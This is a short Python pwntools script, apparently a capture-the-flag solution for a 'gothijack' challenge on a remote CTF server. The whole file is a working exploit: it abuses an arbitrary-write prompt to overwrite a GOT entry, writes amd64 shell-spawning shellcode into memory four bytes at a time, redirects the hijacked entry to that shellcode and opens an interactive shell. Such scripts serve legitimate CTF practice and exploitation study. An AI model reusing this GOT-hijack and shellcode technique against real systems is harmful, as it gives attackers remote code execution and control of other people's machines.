from pwn import *

def write(r, where, data):
    r.sendafter(':', where)
    r.sendafter(':', data)

context.arch = "amd64"

shell = asm(pwnlib.shellcraft.amd64.sh())

#r = process('./gothijack')
r = remote("csie.ctf.tw", 10129)

r.sendafter(':', "jedi")
write(r, '0x601020', p64(0x40090e))

buff = 0x601550
for i in xrange(0,len(shell),4):
    r.sendafter(':', "jedi")
    write(r, hex(buff + i), shell[i:i+4])

r.sendafter(':', "jedi")
write(r, '0x601020', p64(buff))

r.interactive()
